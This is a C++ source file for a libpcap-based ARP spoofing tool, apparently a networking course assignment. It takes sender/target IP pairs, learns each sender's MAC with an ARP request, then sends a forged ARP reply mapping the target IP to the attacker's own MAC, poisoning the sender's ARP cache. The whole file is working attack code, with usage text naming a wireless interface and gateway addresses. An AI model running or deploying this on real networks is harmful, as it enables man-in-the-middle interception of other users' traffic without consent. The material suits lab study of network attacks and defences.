#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "arp-spoof.h"

void usage() {
	printf("arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) {
	if (argc % 2) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	Mac my_mac, sender_mac;
	get_attacker_mac(dev, &my_mac);

	Ip my_ip;
	get_attacker_ip(dev, &my_ip);

	printf("\n");

	for(int i = 2; i < argc; i+=2) {
		Ip sender_ip = Ip(argv[i]);
		Ip target_ip = Ip(argv[i+1]);

		send_arp(handle, Mac("ff:ff:ff:ff:ff:ff"), my_mac, ArpHdr::Request ,my_mac, my_ip, Mac("00:00:00:00:00:00"), sender_ip);

		while(true) {
			struct pcap_pkthdr* header;
			const u_char* send_packet;
			int res = pcap_next_ex(handle, &header, &send_packet);
			if (res == 0) continue;
			if (res == -1 || res == -2) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}

			EthArpPacket* eth_arp_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(send_packet));

			if(eth_arp_packet->eth_.type_ != htons(EthHdr::Arp)) continue;
			if(eth_arp_packet->arp_.op_ != htons(ArpHdr::Reply)) continue;
			if(eth_arp_packet->arp_.sip_!= htonl(sender_ip)) continue;

			sender_mac = eth_arp_packet->arp_.smac_;
			printf("Get sender MAC: %s\n", std::string(sender_mac).c_str());

			break;
		}

		send_arp(handle, sender_mac, my_mac, ArpHdr::Reply, my_mac, target_ip, sender_mac, sender_ip);

	}
	pcap_close(handle);
}